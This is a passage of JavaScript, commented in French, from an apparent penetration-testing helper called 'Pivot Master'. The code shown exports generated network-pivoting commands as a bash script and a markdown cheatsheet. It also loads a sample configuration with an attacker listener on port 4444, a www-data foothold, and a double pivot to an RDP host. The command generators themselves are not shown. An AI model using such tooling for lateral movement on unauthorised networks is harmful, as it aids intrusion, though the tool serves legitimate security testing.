    exportScript() {
        const { attacker, target1, target2, target3, doublePivot } = this.config;
        
        let script = `#!/bin/bash\n`;
        script += `# Pivot Script - Généré par Pivot Master\n`;
        script += `# Configuration:\n`;
        script += `#   Attacker: ${attacker.ip}:${attacker.port}\n`;
        script += `#   Target1:  ${target1.ip} (${target1.user}@${target1.os})\n`;
        script += `#   Target2:  ${target2.ip}:${target2.port} (${target2.os})\n`;
        if (doublePivot) {
            script += `#   Target3:  ${target3.ip}:${target3.port}\n`;
        }
        script += `\n`;

        for (const [technique, commands] of Object.entries(this.generatedCommands)) {
            script += `\n# === ${this.getTechniqueDisplayName(technique)} ===\n`;
            
            commands.forEach(block => {
                script += `\n# ${block.title}\n`;
                block.commands.forEach(line => {
                    if (!line.startsWith('#') && line.trim() !== '') {
                        script += `# ${line}\n`;
                    } else {
                        script += `${line}\n`;
                    }
                });
            });
        }

        this.downloadFile('pivot-commands.sh', script);
        this.showNotification('Script exporté !', 'success');
    }

    /**
     * Export cheatsheet
     */
    exportCheatsheet() {
        let markdown = `# Pivot Cheatsheet\n\n`;
        markdown += `**Généré par Pivot Master**\n\n`;
        markdown += `## Configuration\n\n`;
        markdown += `- **Attacker:** ${this.config.attacker.ip}:${this.config.attacker.port}\n`;
        markdown += `- **Target 1:** ${this.config.target1.ip} (${this.config.target1.user}@${this.config.target1.os})\n`;
        markdown += `- **Target 2:** ${this.config.target2.ip}:${this.config.target2.port} (${this.config.target2.os})\n`;
        if (this.config.doublePivot) {
            markdown += `- **Target 3:** ${this.config.target3.ip}:${this.config.target3.port}\n`;
        }
        markdown += `\n`;

        for (const [technique, commands] of Object.entries(this.generatedCommands)) {
            markdown += `## ${this.getTechniqueDisplayName(technique)}\n\n`;
            
            commands.forEach(block => {
                markdown += `### ${block.title}\n\n`;
                markdown += '```bash\n';
                markdown += block.commands.join('\n');
                markdown += '\n```\n\n';
            });
        }

        this.downloadFile('pivot-cheatsheet.md', markdown);
        this.showNotification('Cheatsheet exportée !', 'success');
    }

    /**
     * Télécharger un fichier
     */
    downloadFile(filename, content) {
        const blob = new Blob([content], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }

    /**
     * Effacer le formulaire
     */
    clearForm() {
        if (confirm('Effacer toutes les données ?')) {
            localStorage.removeItem('pivotMasterConfig');
            location.reload();
        }
    }

    /**
     * Charger un exemple
     */
    loadExample() {
        document.getElementById('attackerIP').value = '10.10.14.15';
        document.getElementById('attackerPort').value = '4444';
        
        document.getElementById('target1IP').value = '192.168.1.100';
        document.getElementById('target1User').value = 'www-data';
        document.getElementById('target1OS').value = 'linux';
        document.getElementById('target1Services').value = '22,80,443';
        
        document.getElementById('target2IP').value = '10.10.10.50';
        document.getElementById('target2Port').value = '22';
        document.getElementById('target2OS').value = 'linux';
        
        document.getElementById('doublePivot').checked = true;
        this.toggleDoublePivot();
        
        document.getElementById('target3IP').value = '172.16.1.50';
        document.getElementById('target3Port').value = '3389';
        
        this.saveConfig();
        this.showNotification('Exemple chargé !', 'info');
    }

    /**
     * Afficher une notification
     */
    showNotification(message, type = 'info', duration = 4000) {
        const container = document.getElementById('notificationContainer');
        if (!container) return;

        const toast = document.createElement('div');
        toast.className = `notification-toast alert-${type}`;
        toast.textContent = message;

        container.appendChild(toast);

        setTimeout(() => {
            toast.remove();
        }, duration);
    }

    updateNetworkVisualization() {
        if (this.networkVisualizer) {
            this.networkVisualizer.updateNetworkFromConfig();
        }
    }
}

// Fonctions globales pour les boutons
function generateCommands() { 
    pivotMaster.generateCommands(); 
}

function clearForm() { 
    pivotMaster.clearForm(); 
}

function loadExample() { 
    pivotMaster.loadExample(); 
}

function copyAllCommands() { 
    pivotMaster.copyAllCommands(); 
}

function exportScript() { 
    pivotMaster.exportScript(); 
}

function exportCheatsheet() { 
    pivotMaster.exportCheatsheet(); 
}

// Fonctions globales pour la visualisation réseau
function resetNetworkView() {
    if (pivotMaster.networkVisualizer) {
        pivotMaster.networkVisualizer.resetNetwork();
    }
}

function fitNetworkView() {
    if (pivotMaster.networkVisualizer) {
        pivotMaster.networkVisualizer.fitNetwork();
    }
}

function exportNetworkImage() {
    if (pivotMaster.networkVisualizer) {
        pivotMaster.networkVisualizer.exportImage();
    }
}

function toggleNetworkPhysics() {
    if (pivotMaster.networkVisualizer) {
        pivotMaster.networkVisualizer.togglePhysics();
    }
}

// Initialisation globale
let pivotMaster;

document.addEventListener('DOMContentLoaded', async () => {
    pivotMaster = new PivotMaster();
    await pivotMaster.init();
}); 